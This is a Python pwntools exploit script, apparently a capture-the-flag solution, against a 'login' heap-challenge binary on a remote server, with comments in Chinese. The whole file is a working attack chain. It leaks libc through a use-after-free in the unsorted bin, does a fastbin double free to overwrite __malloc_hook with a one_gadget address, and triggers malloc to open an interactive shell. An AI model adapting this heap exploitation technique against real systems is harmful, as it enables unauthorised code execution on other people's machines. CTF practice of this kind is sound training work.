from pwn import *

context(arch='amd64', os='linux', log_level='info')

elf  = ELF('./login')
libc = ELF('./libc-2.23.so')

# io = process('./login')
io = remote('120.27.146.76', 26473)

def menu(c):
    io.sendlineafter(b'Your choice:', str(c).encode())

def add(idx, length, pwd):
    menu(2)
    io.sendlineafter(b'Input the user id:', str(idx).encode())
    io.sendlineafter(b'Input the password length:', str(length).encode())
    io.sendafter   (b'Input password:', pwd)

def login(idx, length, pwd):
    menu(1)
    io.sendlineafter(b'Input the user id:', str(idx).encode())
    io.sendlineafter(b'Input the passwords length:', str(length).encode())
    io.sendafter   (b'Input the password:', pwd)

def delete(idx):
    menu(3)
    io.sendlineafter(b'Input the user id:', str(idx).encode())

def edit(idx, pwd):
    menu(4)
    io.sendlineafter(b'Input the user id:', str(idx).encode())
    # Edit 先打印 "Your password is: xxxx" → leak
    io.sendafter   (b'Input new pass:', pwd)

# ---------- 1) Leak libc via unsorted bin + UAF (Edit) ----------
add(0, 0x90, b'A'*8)     # chunk A 进 unsorted bin 用
add(1, 0x10, b'B')       # 防 top 合并
delete(0)                 # users[0] 悬垂；A.fd = main_arena+0x58

# Edit 会先 puts(users[0].pass) -> 直接 leak fd
menu(4)
io.sendlineafter(b'Input the user id:', b'0')
io.recvuntil(b'Your password is:')
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - 0x3c4b78        # main_arena+0x58 在 libc 2.23 的偏移
log.success(f'libc base = {hex(libc.address)}')
io.sendafter(b'Input new pass:', b'\x00')   # 把 edit 流程走完

# ---------- 2) Fastbin double free ----------
add(2, 0x60, b'C')
add(3, 0x60, b'D')

delete(2)
delete(3)
delete(2)                 # fastbin: 2 -> 3 -> 2

# 把 fd 改成 __malloc_hook-0x23 (利用 0x7f 当 fake size)
malloc_hook = libc.sym['__malloc_hook']
fake = malloc_hook - 0x23

edit(2, p64(fake))        # 改 chunk2 的 fd
add(4, 0x60, b'E')        # 取出 2
add(5, 0x60, b'F')        # 取出 3
add(6, 0x60, b'G')        # 再取出 2
# 下一次 malloc(0x60) 会拿到 fake (malloc_hook-0x23)

# glibc 2.23 one_gadget 候选：0x45226 / 0x4527a / 0xf03a4 / 0xf1247
one = libc.address + 0x4527a
payload = b'\x00'*0x13 + p64(one)    # 0x13 偏移到 malloc_hook
add(7, 0x60, payload)

# ---------- 3) trigger ----------
menu(2)
io.sendlineafter(b'Input the user id:', b'8')
io.sendlineafter(b'Input the password length:', b'16')   # 任意 malloc 即可触发

io.interactive()
